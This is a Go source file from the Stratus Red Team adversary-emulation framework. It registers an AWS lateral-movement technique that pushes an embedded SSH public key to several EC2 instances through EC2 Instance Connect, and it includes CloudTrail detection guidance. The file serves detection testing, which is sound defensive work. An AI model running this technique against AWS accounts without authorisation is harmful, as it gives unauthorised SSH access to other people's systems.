package aws

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/service/ec2instanceconnect"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"strings"
)

//go:embed my_key.pub
var publicSSHKey string

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.lateral-movement.ec2-instance-connect",
		FriendlyName: "Usage of EC2 Instance Connect on multiple instances",
		IsSlow:       true,
		Description: `
Simulates an attacker pushing an SSH public key to multiple EC2 instances, which then will allow anyone with the corresponding private key to 
connect directly to the systems via SSH.

Warm-up:

- Create multiple EC2 instances and a VPC (takes a few minutes).

Detonation: 

- Adds a public SSH key to the EC2 for 60 seconds.

References:

- https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#hands-on-keyboard-activity-begins
- https://sysdig.com/blog/2023-global-cloud-threat-report/
- https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/
`,
		Detection: `
Identify, through CloudTrail's <code>SendSSHPublicKey</code> event, when a user is adding an SSH key to multiple EC2 instances. Sample event:

` + codeBlock + `
{
  "eventSource": "ec2-instance-connect.amazonaws.com",
  "eventName": "SendSSHPublicKey",
  "requestParameters": {
    "instanceId": "i-123456",
    "instanceOSUser": "ec2-user",
    "sSHPublicKey": "ssh-ed25519 ..."
  }
}
` + codeBlock + `
`,
		Platform:                   stratus.AWS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.LateralMovement},
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ec2instanceconnectClient := ec2instanceconnect.NewFromConfig(providers.AWS().GetConnection())
	instanceIDs := strings.Split(params["instance_ids"], ",")

	for _, instanceID := range instanceIDs {
		cleanInstanceID := strings.Trim(instanceID, " \"\n\r")
		err := sendSSHPublicKey(ec2instanceconnectClient, cleanInstanceID, "ec2-user", publicSSHKey)
		if err != nil {
			return fmt.Errorf("failed to send SSH public key to instance %s: %v", cleanInstanceID, err)
		}

		log.Printf("SSH public key successfully added to instance %s", cleanInstanceID)
	}

	return nil
}

func sendSSHPublicKey(ec2instanceconnectClient *ec2instanceconnect.Client, instanceId, instanceOSUser, sshPublicKey string) error {
	_, err := ec2instanceconnectClient.SendSSHPublicKey(context.Background(), &ec2instanceconnect.SendSSHPublicKeyInput{
		InstanceId:     &instanceId,
		InstanceOSUser: &instanceOSUser,
		SSHPublicKey:   &sshPublicKey,
	})

	return err
}
